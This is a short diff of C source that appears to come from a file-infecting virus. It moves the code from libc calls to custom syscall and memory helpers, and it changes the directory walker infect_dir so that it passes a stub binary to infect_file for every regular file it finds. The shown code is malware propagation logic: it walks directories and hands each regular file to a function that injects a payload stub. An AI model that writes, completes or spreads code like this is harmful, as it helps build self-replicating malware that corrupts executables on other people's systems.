@@ -8,7 +8,7 @@ static int is_regular(const char *path, const struct dirent *ent)
 		return (1);
 	if (ent->d_type != DT_UNKNOWN)
 		return (0);
-	if (lstat(path, &st) < 0)
+	if (sys_ret_is_err(sys_lstat(path, &st)))
 		return (0);
 	return (S_ISREG(st.st_mode));
 }
@@ -19,13 +19,13 @@ static int join_path(char *buf, size_t size, const char *dir, const char *name)
 	size_t dlen;
 	size_t nlen;
 
-	dlen = strlen(dir);
-	nlen = strlen(name);
+	dlen = my_strlen(dir);
+	nlen = my_strlen(name);
 	if (dlen + 1 + nlen + 1 > size)
 		return (1);
-	memcpy(buf, dir, dlen);
+	my_memcpy(buf, dir, dlen);
 	buf[dlen] = '/';
-	memcpy(buf + dlen + 1, name, nlen);
+	my_memcpy(buf + dlen + 1, name, nlen);
 	buf[dlen + 1 + nlen] = '\0';
 	return (0);
 }
@@ -47,7 +47,7 @@ void infect_dir(const char *dir)
 			continue ;
 		if (!is_regular(path, ent))
 			continue ;
-		infect_file(path);
+		infect_file(path, stub_bin, stub_bin_len);
 	}
 	closedir(d);
 }
